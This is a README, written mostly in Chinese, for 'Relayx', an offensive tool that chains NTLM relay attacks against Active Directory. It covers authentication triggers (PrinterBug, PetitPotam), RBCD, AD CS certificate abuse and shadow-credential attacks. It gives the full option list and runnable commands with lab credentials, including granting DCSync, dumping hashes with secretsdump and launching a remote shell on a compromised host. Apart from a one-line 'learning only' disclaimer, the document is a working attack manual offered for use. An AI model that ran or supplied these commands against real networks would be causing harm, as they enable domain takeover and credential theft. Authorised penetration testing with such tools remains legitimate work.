# Relayx
## 声明
**一切开发旨在学习，请勿用于非法用途**

## Usage
将几个比较好用的relay集成到了一起，提高测试效率。
```
DCpwn with ntlmrelay

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse local files)

options:
  -h, --help            show this help message and exit
  -r CALLBACK_IP, --callback-ip CALLBACK_IP
                        Attacker callback IP
  --timeout TIMEOUT     timeout in seconds
  --debug               Enable debug output
  -ts                   Adds timestamp to every logging output
  --no-trigger          Start exploit server without trigger.
  --no-attack           Start trigger for test.
  --smb-port SMB_PORT   Port to listen on smb server
  -rpc-smb-port [destination port]
                        Destination port to connect to SMB Server

authentication:
  -hashes LMHASH:NTHASH
                        Hash for account auth (instead of password)

connection:
  -dc-ip ip address     IP address of the Domain Controller
  -adcs-ip ip address   IP Address of the ADCS, if unspecified, dc ip will be used
  --ldap                Use ldap.
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it

attack:
  -m {rbcd,pki,sdcd}, --method {rbcd,pki,sdcd}
                        Set up attack method, rbcd or pki or sdcd (shadow credential)
  -t {printer,efs}, --trigger {printer,efs}
                        Set up trigger method, printer or petitpotam
  --impersonate IMPERSONATE
                        target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for delegation to the SPN specified
  --add-computer [COMPUTERNAME]
                        Attempt to add a new computer account
  -pipe {efsr,lsarpc,samr,netlogon,lsass}
                        Named pipe to use (default: lsarpc)
  --template TEMPLATE   AD CS template. If you are attacking Domain Controller or other windows server machine, default value should be suitable.
  -pp PFX_PASS, --pfx-pass PFX_PASS
                        PFX password.
  -ssl                  This is useful when AD CS use ssl.

execute:
  -shell                Launch semi-interactive shell, Default is False
  -share SHARE          share where the output will be grabbed from (default ADMIN$)
  -shell-type {cmd,powershell}
                        choose a command processor for the semi-interactive shell
  -codec CODEC          Sets encoding used (codec) from the target's output (default "GBK").
  -service-name service_name
                        The name of theservice used to trigger the payload
  -mode {SHARE,SERVER}  mode to use (default SHARE, SERVER needs root!)
```
## 认证触发
工具中包含了两种触发机器回连的操作。
printerbug 和 PetitPotam。 触发可通过指定参数来实现，默认使用printerbug
```
-t printer  # 使用 打印机bug  触发
-t efs      # 使用 MS-EFSRPC 触发
```

如果不需要工具主动去触发回连，可以添加参数`--no-trigger`,这样就可以通过其他方式来进行触发,同样的，可以添加参数`--no-attack`来指定只触发回连。

## 攻击场景
目前支持三种攻击方式
```
-m rbcd     # 普通域成员RBCD，高权限，添加Dcsync权限
-m pki      # 向AD CS申请证书
-m sdcd     # 通过ldap添加 msDS-KeyCredentialLink 属性进行攻击，需要 Server >= 2016
```
### 一、攻击Exchange服务器
默认Exchange的服务权限较高，所以工具会利用Exchange的权限将当前用户增加Dcsync权限。
```
python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.201 -r 10.211.55.2 -dc-ip 10.211.55.200
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210728171035.png)

>目标的方式可以使用impacket的方式来写，@后跟目标即可，-r 是回连IP，也就是我们的攻击IP，-dc-ip 指定要去认证或者请求的DC ip, 后面一样，就不再重复。

攻击之后，当前用户可进行dcsync：
```
secretsdump.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.200 -just-dc-user cgdomain\\exchange$
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210728171339.png)

使用aclpwn可进行还原(这里需要exchange服务器的机器账号hash):
```
aclpwn -r aclpwn-xxxxx-xxxxx.restore
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210728171452.png)


### 二、攻击域成员机器
攻击普通服务器会自动使用RBCD（基于资源的约束委派）来攻击，所以这里需要域级别>= Server2012R2。
```
python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.202 -r 10.211.55.2 -dc-ip 10.211.55.203 -shell
```

![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210728172026.png)

攻击成功后，会自动获取一个交互式shell，并会生成一个ccache文件供以后使用，这里默认会模拟`administrator`的身份，如果不存在administrator，可通过`--impersonate` 来指定目标用户,如果未添加`-shell`参数，只保存请求到的票据。

>这里默认会添加一个新的计算机账号，可通过--add-computer 来指定机器名，不指定则为随机名。

### 三、攻击AD CS
这里要求目标环境安装了`AD CS`。攻击AD CS 可以通过`-m pki` 来指定。
```
python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.202 -r 10.211.55.2 -dc-ip 10.211.55.200 -m pki
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210728173221.png)

这里会向CS申请一个机器账号的证书，之后通过Rubues进行后续攻击即可。

![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210728173445.png)


### 四、利用msDS-KeyCredentialLink
类似于RBCD，优点是不需要添加计算机账号，缺点是需要Server版本高于2016, 可通过`-m sdcd` 来指定。
```
python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.202 -r 10.211.55.2 -dc-ip 10.211.55.200 -m sdcd
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210803105506.png)

>本地没2016环境。所以会报个错。

后续可通过Rubues进行后续攻击。

## 编译
可以使用以下命令进行编译
```
pyinstaller -F -c relayx.py --collect-all impacket --add-data 'comm/ntlmrelayx/attacks/*:comm/ntlmrelayx/attacks'
```